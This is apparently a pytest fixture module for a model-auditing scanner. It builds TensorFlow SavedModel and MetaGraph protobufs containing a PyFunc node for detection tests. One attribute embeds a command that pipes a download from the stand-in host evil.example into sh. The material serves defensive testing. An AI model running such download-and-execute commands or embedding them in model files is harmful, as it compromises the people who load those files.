"""Shared protobuf-only TensorFlow fixture helpers."""

import importlib
from typing import cast

import pytest

from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos


def _require_tf_protos() -> None:
    if not _has_tf_protos():
        pytest.skip("TensorFlow protobuf stubs unavailable")


def _build_malicious_tf_savedmodel() -> bytes:
    return build_tf_savedmodel("pyfunc_node", "PyFunc")


def build_tf_savedmodel(node_name: str | None, operation: str, version: str | None = None) -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
    saved_model = saved_model_pb2.SavedModel()
    saved_model.saved_model_schema_version = 1
    metagraph = saved_model.meta_graphs.add()
    if version is not None:
        metagraph.meta_info_def.meta_graph_version = version
    node = metagraph.graph_def.node.add()
    if node_name is not None:
        node.name = node_name
    node.op = operation
    return cast(bytes, saved_model.SerializeToString())


def build_malicious_tf_metagraph(version: str) -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
    metagraph = meta_graph_pb2.MetaGraphDef()
    metagraph.meta_info_def.meta_graph_version = version
    node = metagraph.graph_def.node.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
    return cast(bytes, metagraph.SerializeToString())
